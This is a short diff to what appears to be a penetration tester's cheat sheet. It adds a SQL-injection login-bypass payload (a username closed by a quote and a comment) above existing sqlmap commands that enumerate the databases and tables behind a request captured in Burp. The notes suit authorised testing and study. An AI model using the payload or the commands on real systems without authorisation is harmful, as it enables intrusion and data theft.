@@ -2,6 +2,10 @@
 
 ## SqlMap
 
+Try to bypass, if possible:
+<username>'-- -
+<fake pass>
+
 Get Request from Burp (Proxy request, send to repeater, copy all text, r-c copy to file)
 sqlmap -r <req file> -p <POST Parameter> --batch --level 3 (--dbs)
 sqlmap -r <req file> -p <POST Parameter> --batch --level 3 -D <db name> --tables
